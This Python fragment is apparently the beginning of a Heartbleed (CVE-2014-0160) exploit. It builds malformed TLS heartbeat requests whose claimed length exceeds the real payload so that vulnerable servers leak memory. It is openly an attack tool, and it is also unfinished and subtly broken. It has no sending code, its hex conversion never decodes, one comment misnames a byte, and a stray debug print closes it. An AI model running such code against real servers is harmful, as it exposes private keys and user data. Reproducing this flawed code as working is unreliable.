import re
import sys
import struct
import socket
import time
import select
from datetime import datetime
from optparse import OptionParser
HEARTBEAT = "\
18 \
03 {tls_revision:02X} {payload_length:04X} \
01 {claimed_length:04X} {payload} \
"
class Settings:
    debug = True
    dump_file = None

def clamp(min_value, value, max_value):
    """ Fixes a value between two bounds, inclusive. """
    return min(max(min_value, value), max_value)

def log(msg):
    sys.stderr.write("{}\n".format(msg))
    sys.stderr.flush()

def debug(msg):
    if Settings.debug:
        log(msg)


def printable(c):
    """ Masks non-printable characters to `.` """
    return c if 32 <= ord(c) <= 126 else '.'

def bin2hex(s):
    """ Transforms a bytestring into an ASCII hex table of width 16 """
    def produce_line(offset):
        line = s[ offset : offset+16 ]
        hex_data = ' '.join( '{:02X}'.format(ord(c)) for c in line )
        str_data =  ''.join( map(printable, line) )
        return '{:04x}: {:<48s} {:s}'.format(offset, hex_data, str_data)
    return '\n'.join( produce_line(offset) for offset in range(0, len(s), 16) )

def hex2bin(s):
    """ Parses an ASCII hex table into a bytestring """
    return re.sub(r'\s', '', s)

def produce_heartbeat(payload_length, claimed_length, tls_revision):
    """
    Will produce a heartbeat message, whose actual payload
    content is `payload_length` bytes long, with a claimed
    length of `claimed_length` bytes.
    If the claimed length is larger than the actual payload
    length, this will trick a vulnerable server into replying
    with more data than actually sent, as has been described in
    [CVE-2014-0160] as _[heartbleed]_.
    [heartbleed]: http://heartbleed.com/
    [CVE-2014-160]: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0160
    """
    overhead = 3 # Account for necessary data
    payload_length = clamp(1, payload_length, 0x4000 - overhead)
    claimed_length = clamp(1, claimed_length, 0xFFFF)
    tls_revision   = clamp(0, tls_revision, 2)
    payload = '50' * payload_length # `/` character
    message = hex2bin(HEARTBEAT.format(
        tls_revision = tls_revision,
        payload_length = payload_length + overhead,
        claimed_length = claimed_length,
        payload = payload,
    ))
    if Settings.debug:
        debug('Produced this Heartbeat request:')
        debug(bin2hex(message))
    return message
print("hellp")